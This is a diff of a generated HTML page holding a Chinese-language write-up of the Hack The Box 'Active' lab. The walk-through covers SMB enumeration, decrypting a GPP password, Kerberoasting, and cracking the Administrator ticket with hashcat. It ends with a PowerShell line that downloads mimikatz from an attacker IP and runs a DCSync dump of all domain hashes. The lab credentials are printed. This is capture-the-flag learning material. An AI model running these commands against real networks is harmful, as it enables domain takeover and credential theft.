@@ -1095,6 +1095,27 @@
   
   
     <li class="md-nav__item">
+      <a href="../Sizzle/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Sizzle
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../Visual/" class="md-nav__link">
         
   
@@ -1382,8 +1403,11 @@
 <p><img alt="" src="../assets/Active.png" /></p>
 <h2 id="recon-enum">Recon &amp; Enum</h2>
 <blockquote>
-<p>export IP=10.10.10.100
-- <code>nmap -sC -A -p- --min-rate 1000 -T4 $IP</code>
+<p>export IP=10.10.10.100</p>
+</blockquote>
+<ul>
+<li><code>nmap -sC -A -p- --min-rate 1000 -T4 $IP</code></li>
+</ul>
 <div class="language-shell highlight"><pre><span></span><code>PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>VERSION
 <span class="m">53</span>/tcp<span class="w">    </span>open<span class="w">  </span>domain<span class="w">        </span>Microsoft<span class="w"> </span>DNS<span class="w"> </span><span class="m">6</span>.1.7601<span class="w"> </span><span class="o">(</span>1DB15D39<span class="o">)</span><span class="w"> </span><span class="o">(</span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2008</span><span class="w"> </span>R2<span class="w"> </span>SP1<span class="o">)</span>
 <span class="p">|</span><span class="w"> </span>dns-nsid:<span class="w"> </span>
@@ -1427,7 +1451,9 @@ Host<span class="w"> </span>script<span class="w"> </span>results:
 <span class="p">|</span><span class="w">   </span><span class="m">2</span>:1:0:<span class="w"> </span>
 <span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>and<span class="w"> </span>required
 </code></pre></div>
-- <code>ldapsearch</code>
+<ul>
+<li><code>ldapsearch</code></li>
+</ul>
 <div class="language-shell highlight"><pre><span></span><code>ldapsearch<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;ldap://</span><span class="nv">$IP</span><span class="s2">&quot;</span><span class="w"> </span>-x<span class="w"> </span>-s<span class="w"> </span>base<span class="w"> </span>namingcontexts
 ---
 dn:
@@ -1441,20 +1467,23 @@ ldapsearch<span class="w"> </span>-H<span class="w"> </span><span class="s2">&qu
 ---
 Null
 </code></pre></div>
-- enum4linux
-<img alt="" src="../assets/Pasted%20image%2020240111220611.png" />
+<ul>
+<li>enum4linux</li>
+</ul>
+<p><img alt="" src="../assets/Pasted%20image%2020240111220611.png" />
 发现部分 SMB Shares
-- <code>smbclient //10.10.10.100/Replication</code>
-<img alt="" src="../assets/Pasted%20image%2020240111220725.png" />
-<img alt="" src="../assets/Pasted%20image%2020240111220839.png" />
-发现了4个文件，并在其中发现了账户 <code>active.htb\SVC_TGS</code> 和被加密的密码： <code>edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code></p>
-</blockquote>
+- <code>smbclient //10.10.10.100/Replication</code></p>
+<p><img alt="" src="../assets/Pasted%20image%2020240111220725.png" />
+<img alt="" src="../assets/Pasted%20image%2020240111220839.png" /></p>
+<p>发现了4个文件，并在其中发现了账户 <code>active.htb\SVC_TGS</code> 和被加密的密码： <code>edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code></p>
 <h2 id="shell-as-user-svc_tgs">Shell as User - SVC_TGS</h2>
 <p><img alt="" src="../assets/Pasted%20image%2020240111222504.png" />
 是 AES-256 加密，可以使用 <code>gpp-decrypt</code> 解密
 <img alt="" src="../assets/Pasted%20image%2020240111223117.png" />
-<code>active.htb/SVC_TGS:GPPstillStandingStrong2k18</code>
-- 继续枚举 Samba Shares
+<code>active.htb/SVC_TGS:GPPstillStandingStrong2k18</code></p>
+<ul>
+<li>继续枚举 Samba Shares</li>
+</ul>
 <div class="language-shell highlight"><pre><span></span><code>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-u<span class="w"> </span>SVC_TGS<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span><span class="w"> </span>--shares
 ---
 SMB<span class="w">         </span><span class="m">10</span>.10.10.100<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">6</span>.1<span class="w"> </span>Build<span class="w"> </span><span class="m">7601</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:DC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:active.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
@@ -1470,29 +1499,37 @@ SMB<span class="w">         </span><span class="m">10</span>.10.10.100<span clas
 SMB<span class="w">         </span><span class="m">10</span>.10.10.100<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span>SYSVOL<span class="w">          </span>READ<span class="w">            </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
 SMB<span class="w">         </span><span class="m">10</span>.10.10.100<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span>Users<span class="w">           </span>READ
 </code></pre></div>
-- 找到 Users 目录
-<img alt="" src="../assets/Pasted%20image%2020240111225225.png" />
-- 遛狗
-<img alt="" src="../assets/Pasted%20image%2020240112083039.png" />
+<ul>
+<li>找到 Users 目录</li>
+</ul>
+<p><img alt="" src="../assets/Pasted%20image%2020240111225225.png" /></p>
+<ul>
+<li>遛狗</li>
+</ul>
+<p><img alt="" src="../assets/Pasted%20image%2020240112083039.png" />
 但是没 shell，操作不了</p>
 <h2 id="shell-as-root">Shell as Root</h2>
 <ul>
-<li>查看设置了 SPN 的账户，发现 administrator
-<div class="language-shell highlight"><pre><span></span><code>impacket-GetUserSPNs<span class="w"> </span>active.htb/SVC_TGS:GPPstillStandingStrong2k18<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-dc-host<span class="w"> </span>DC.active.htb
+<li>查看设置了 SPN 的账户，发现 administrator</li>
+</ul>
+<p><div class="language-shell highlight"><pre><span></span><code>impacket-GetUserSPNs<span class="w"> </span>active.htb/SVC_TGS:GPPstillStandingStrong2k18<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-dc-host<span class="w"> </span>DC.active.htb
 </code></pre></div>
-<img alt="" src="../assets/Pasted%20image%2020240111230435.png" /></li>
-<li>尝试 Kerberoasting 获取服务 Hash
-<div class="language-shell highlight"><pre><span></span><code>impacket-GetUserSPNs<span class="w"> </span>active.htb/SVC_TGS:GPPstillStandingStrong2k18<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-dc-host<span class="w"> </span>DC.active.htb<span class="w"> </span>-request
+<img alt="" src="../assets/Pasted%20image%2020240111230435.png" /></p>
+<ul>
+<li>尝试 Kerberoasting 获取服务 Hash</li>
+</ul>
+<p><div class="language-shell highlight"><pre><span></span><code>impacket-GetUserSPNs<span class="w"> </span>active.htb/SVC_TGS:GPPstillStandingStrong2k18<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-dc-host<span class="w"> </span>DC.active.htb<span class="w"> </span>-request
 </code></pre></div>
-<img alt="" src="../assets/Pasted%20image%2020240112085559.png" /></li>
-<li>爆破 Hash
+<img alt="" src="../assets/Pasted%20image%2020240112085559.png" />
+- 爆破 Hash
 <div class="language-shell highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>hash.list<span class="w"> </span>/usr/share/wordlists/rockyou.txt
 ---
 <span class="nv">$krb5tgs$23$*</span>Administrator<span class="nv">$ACTIVE</span>.HTB<span class="nv">$active</span>.htb/Administrator*<span class="nv">$ab13391da2a1d4d8992ba3d12d3927ef$26</span>a5ea21be878ceff5464e9c76c032fac700d4ec0b10566a55fdefbf7c629fa1c63e2b6c10a34e6517e704b3cd9909493a6944f60416772d662d7284c2d5733cc3fa0fda0819dcda9f581e7a3d5fad7227966886ee1349e01c297c1e3656e02a1d790ec71161c80d5d4143d84975fa67512ab2f17acd0d4a2104744d4c576d7e207460ddd6a9f754123176ea901f33c0b3f58e64658c81b81df8f996f44b764e7970ae9d265032925db343bfac983471b6b8690319e8d8c8cfa2709ff2e19b458a20d5524ca25dbefd49ebf24625ffcc8707e2d0578e418fba6ab474c428f26c853126f8901a733540577a7f739f425ee1683b51b5b32de021b2facbc1f04292d8a5bb35c03c7541f6d95cc939ddc198612d88ef9df6d20e20651d2cc48b10edfc3ec470ddd7488b42ffeb92b0bc733c5120273b0a600fee4cda1777042d88b5376ea32176dfbb405165824fdcb5715db92521599469a137c41fffe5e079985a7646ea6859b4c5a656bc8ef4c6aea250f8eafcc080e4a039146e474dab7f18221d518ae85381596aefc231b72df63e92935c483addbc4b2e6cb49be7162526cc30cc78bbe6e638115188ccee8a20d3d10fe3e5604567d6908d92ab09054ab8c46172438dc964c7075749bf4a94122e7dc6bd0cd2dd737c194fbc671d087a36fcd84d1f500377970246036e8deab3712977d8615deb600f38a27253a908d9544b9dff17a7dbdd36e5c70c6b2a99814f822c6b74d1a3646f88ce93a391f3e384ac81fe142dce20bf2273e457d74c7184ff1e0799473139ea7e1dd18c293819b922a66b8d5b0872f352cba575cee04fda5ee9f834c470051aa6e4d083411a092923d23334f13550437cbd92fd6da6d5cd322fa321c379e89535685110027522852e7e1ee79350ced72ec807cab49afd0c8b8c9c607f665c43d318f4a22135f20a33da060aa5ee8914d5e59c143bfe64e3f95c2497ea613e7d7eb42650709bc77feb4e66fc26cde267c5332a1d015ec0095d3eacf1ce016778db78df448e22a113bbe11f151cce087c2dff879de0a6b305caf0bcb3f36b63e97a7b4079972395c472c6ae3bd4b72b6f6efae046a69dcf6bc5cd370d366c4f89ee0dc41d0aa95231a994764e2d45e61a5720d20cec8b5fe12548527143b187b4eda59cc94ec2729d29ea0424dce5a2c8f459fe23f3957a6bd4f08883932867fdf8f29b2b805f9a769f479f2a1f7d2029aeea8fa44c891bf6089947580f2a707747bf7f:Ticketmaster1968
-</code></pre></div></li>
-<li><code>Administrator:Ticketmaster1968</code>
-<img alt="" src="../assets/Pasted%20image%2020240112090148.png" /></li>
+</code></pre></div></p>
+<ul>
+<li><code>Administrator:Ticketmaster1968</code></li>
 </ul>
+<p><img alt="" src="../assets/Pasted%20image%2020240112090148.png" /></p>
 <h2 id="dump-hash">Dump Hash</h2>
 <div class="language-shell highlight"><pre><span></span><code>powershell<span class="w"> </span><span class="o">(</span>new-object<span class="w"> </span>System.Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">&#39;http://10.10.16.18/mimikatz.exe&#39;</span>,<span class="s1">&#39;C:\Windows\Temp\mimikatz.exe&#39;</span><span class="o">)</span>
 C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\m</span>imikatz.exe<span class="w"> </span><span class="s2">&quot;privilege::debug&quot;</span><span class="w"> </span><span class="s2">&quot;token::elevate&quot;</span><span class="w"> </span><span class="s2">&quot;lsadump::dcsync /domain:active.htb /all /csv&quot;</span><span class="w"> </span><span class="nb">exit</span>
